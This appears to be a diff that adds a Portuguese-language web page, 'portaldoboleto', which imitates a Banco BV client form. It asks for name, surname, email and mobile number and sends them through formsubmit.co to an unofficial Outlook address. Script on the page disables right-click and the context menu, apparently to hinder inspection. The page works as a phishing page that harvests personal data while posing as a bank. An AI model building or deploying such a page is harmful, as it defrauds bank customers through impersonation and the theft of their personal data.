@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="assets/css/style.css">
+    <title>portaldoboleto</title>
+</head>
+<body>
+    <script type="text/javascript">
+		//desabilita menu de opções após clicar no botão direito
+		function desabilitaMenu(e)
+		{
+		if (window.Event)
+		{
+		if (e.which == 2 || e.which == 3)
+		return false;
+		}
+		else
+		{
+		event.cancelBubble = true
+		event.returnValue = false;
+		return false;
+		}
+		}
+		
+		//desabilita botão direito
+		function desabilitaBotaoDireito(e)
+		{
+		if (window.Event)
+		{
+		if (e.which == 2 || e.which == 3)
+		return false;
+		}
+		else
+		if (event.button == 2 || event.button == 3)
+		{
+		event.cancelBubble = true
+		event.returnValue = false;
+		return false;
+		}
+		}
+		
+		//desabilita botão direito do mouse
+		if ( window.Event )
+		document.captureEvents(Event.MOUSEUP);
+		if ( document.layers )
+		document.captureEvents(Event.MOUSEDOWN);
+		
+		document.oncontextmenu = desabilitaMenu;
+		document.onmousedown = desabilitaBotaoDireito;
+		document.onmouseup = desabilitaBotaoDireito;
+		</script>
+    <div class="container">
+        <div class="form-image">
+            <img src="assets/img/undraw_team_up_re_84ok.svg">
+
+        </div>
+        <div class="form">
+            <form class="contact-form" action="https://formsubmit.co/bancobv@outlook.pt" method="POST">
+                <input type="hidden" name="_next" value="http://127.0.0.1:5555/">
+                <input type="hidden" name="_subject" value="new submission!">
+                <div class="form-header">
+                    <div class="tirle">
+                        <h1>Cliente Bv</h1>
+                    </div>
+                    <div class="login-button">
+                        <button><a href="#">Enviar</a></button>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <div class="input-box">
+                        <label for="firstname">Primero nome</label>
+                        <input id="firstname" type="text" name="firstname" placeholder="Digite seu primeiro nome" required >
+                    </div>
+
+                    <div class="input-box">
+                        <label for="lastename">Sobre nome</label>
+                        <input id="lastename" type="text" name="lastename" placeholder="Digite seu sobrenome" required >
+                    </div>
+
+                    <div class="input-box">
+                        <label for="email">E-mail</label>
+                        <input id="email" type="text" name="email" placeholder="Digite seu email" required >
+                    </div>
+
+                    <div class="input-box">
+                        <label for="number">Celular</label>
+                        <input id="number" type="text" name="number" placeholder="(xx) xxxx-xxxx" required >
+                    </div>
+                </div>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
